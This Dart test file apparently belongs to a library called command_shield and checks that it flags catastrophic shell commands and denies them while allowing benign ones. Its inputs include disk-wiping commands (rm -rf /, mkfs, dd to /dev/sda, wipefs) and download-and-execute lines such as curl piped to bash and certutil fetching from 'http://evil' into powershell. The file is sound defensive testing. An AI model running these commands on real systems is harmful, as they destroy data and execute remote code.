import 'package:command_shield/command_shield.dart';
import 'package:test/test.dart';

/// Regression tests.
///
/// Process: whenever a bug is fixed, add a test here that reproduces the
/// original issue and verifies the fix. Each test references the behaviour it
/// locks in. Never remove a regression test without a documented reason.
void main() {
  final shield = CommandShield(defaultSyntax: CommandSyntax.bash);

  group('catastrophic-command regressions', () {
    test('REG-001: "rm -rf /" must be CRITICAL + DENY', () {
      final analysis = shield.analyze('rm -rf /');
      expect(analysis.securityLevel, SecurityLevel.critical);
      expect(shield.validate('rm -rf /').decision, CommandDecision.deny);
    });

    test('REG-002: "curl ... | bash" must be CRITICAL + DENY', () {
      const cmd = 'curl https://example.com/install.sh | bash';
      expect(shield.analyze(cmd).securityLevel, SecurityLevel.critical);
      expect(shield.validate(cmd).decision, CommandDecision.deny);
    });

    test('REG-003: wrapped "sudo rm -rf /" remains CRITICAL', () {
      expect(
        shield.analyze('sudo rm -rf /').securityLevel,
        SecurityLevel.critical,
      );
    });

    test('REG-020: "mkfs.ext4 /dev/sda" must be CRITICAL + DENY', () {
      final analysis = shield.analyze('mkfs.ext4 /dev/sda');
      expect(analysis.securityLevel, SecurityLevel.critical);
      expect(
        shield.validate('mkfs.ext4 /dev/sda').decision,
        CommandDecision.deny,
      );
    });

    test('REG-021: wrapped "sudo mkfs /dev/sdb" remains CRITICAL', () {
      expect(
        shield.analyze('sudo mkfs /dev/sdb').securityLevel,
        SecurityLevel.critical,
      );
    });

    test('REG-022: "dd if=/dev/zero of=/dev/sda" must be CRITICAL + DENY', () {
      const cmd = 'dd if=/dev/zero of=/dev/sda';
      expect(shield.analyze(cmd).securityLevel, SecurityLevel.critical);
      expect(shield.validate(cmd).decision, CommandDecision.deny);
    });

    test('REG-023: "wipefs -a /dev/sdb" must be CRITICAL', () {
      expect(
        shield.analyze('wipefs -a /dev/sdb').securityLevel,
        SecurityLevel.critical,
      );
    });

    test('REG-024: "srm -rf /" must be CRITICAL', () {
      expect(shield.analyze('srm -rf /').securityLevel, SecurityLevel.critical);
    });

    test('REG-028: "find / -delete" must be CRITICAL + DENY', () {
      final analysis = shield.analyze('find / -delete');
      expect(analysis.securityLevel, SecurityLevel.critical);
      expect(shield.validate('find / -delete').decision, CommandDecision.deny);
    });

    test('REG-025: "certutil ... | powershell" is download-and-execute', () {
      const cmd = 'certutil -urlcache -f http://evil/x.ps1 | powershell';
      expect(shield.analyze(cmd).securityLevel, SecurityLevel.critical);
      expect(shield.validate(cmd).decision, CommandDecision.deny);
    });
  });

  group('false-positive prevention regressions', () {
    test('REG-010: operators inside quotes are not dangerous operators', () {
      final analysis = shield.analyze('echo "a | b ; c && d"');
      expect(
        analysis.findings.any((f) => f.code == 'dangerous-operator'),
        isFalse,
      );
      expect(
        shield.validate('echo "a | b ; c && d"').decision,
        CommandDecision.allow,
      );
    });

    test('REG-011: "echo rm" is not classified as destructive', () {
      expect(
        shield
            .analyze('echo rm')
            .findings
            .any((f) => f.code == 'destructive-command'),
        isFalse,
      );
    });

    test('REG-012: PowerShell -ExecutionPolicy is not -EncodedCommand', () {
      final shield = CommandShield(defaultSyntax: CommandSyntax.powershell);
      final analysis = shield.analyze(
        'powershell -ExecutionPolicy Bypass -File x.ps1',
      );
      final shellFindings = analysis.findings.where(
        (f) => f.code == 'shell-execution',
      );
      expect(
        shellFindings.every((f) => f.level != SecurityLevel.critical),
        isTrue,
      );
    });

    test('REG-013: single-quoted "rm -rf /" string is not catastrophic', () {
      // It is an argument to echo, not an executed deletion.
      final analysis = shield.analyze("echo 'rm -rf /'");
      expect(analysis.securityLevel, SecurityLevel.safe);
    });

    test('REG-014: normal relative path is not path traversal', () {
      expect(
        shield
            .analyze('cat src/main.dart')
            .findings
            .any((f) => f.code == 'path-traversal'),
        isFalse,
      );
    });

    test('REG-026: "dd if=in.img of=out.img" file copy is not destructive', () {
      expect(
        shield
            .analyze('dd if=in.img of=out.img')
            .findings
            .any((f) => f.code == 'destructive-command'),
        isFalse,
      );
      expect(
        shield.validate('dd if=in.img of=out.img').decision,
        CommandDecision.allow,
      );
    });

    test('REG-029: "find . -name x.tmp -delete" is not catastrophic', () {
      // Scoped find -delete is medium (a real deletion) but must NOT be
      // critical or denied like `find / -delete`.
      final analysis = shield.analyze('find . -name "*.tmp" -delete');
      expect(analysis.securityLevel, isNot(SecurityLevel.critical));
    });

    test('REG-030: "command -v foo" lookups are not destructive', () {
      // Resolving a name must not be treated as running it.
      for (final cmd in const [
        'command -v rm',
        'command -v mkfs.ext4',
        'command -V dd',
      ]) {
        expect(
          shield
              .analyze(cmd)
              .findings
              .any((f) => f.code == 'destructive-command'),
          isFalse,
          reason: cmd,
        );
        expect(
          shield.validate(cmd).decision,
          CommandDecision.allow,
          reason: cmd,
        );
      }
    });

    test('REG-031: real execution through "command" still looks through', () {
      // `command rm -rf /` (no -v) genuinely runs rm and must stay critical.
      expect(
        shield.analyze('command rm -rf /').securityLevel,
        SecurityLevel.critical,
      );
    });

    test('REG-027: routine system/read commands stay ALLOW', () {
      for (final cmd in const [
        'systemctl status nginx',
        'kubectl get pods',
        'mount',
        'fdisk -l',
      ]) {
        expect(
          shield.validate(cmd).decision,
          CommandDecision.allow,
          reason: cmd,
        );
      }
    });

    test('REG-016: leading operators must not hang the parser', () {
      // Inputs beginning with an operator once caused an infinite loop in the
      // script parser because no token was consumed. They must terminate.
      for (final cmd in ['| | |', '&&&&', '>>>', '; ; ;', '|']) {
        expect(() => shield.validate(cmd), returnsNormally, reason: cmd);
        final ps = CommandShield(defaultSyntax: CommandSyntax.powershell);
        expect(() => ps.validate(cmd), returnsNormally, reason: 'ps: $cmd');
      }
    });

    test('REG-015: analysis never throws on malformed input', () {
      const malformed = [
        r'$(',
        '`',
        '"',
        "'",
        '| | |',
        '&&&&',
        '>>>',
        r'${',
        'cmd \\',
      ];
      for (final cmd in malformed) {
        expect(() => shield.validate(cmd), returnsNormally, reason: cmd);
      }
    });
  });
}
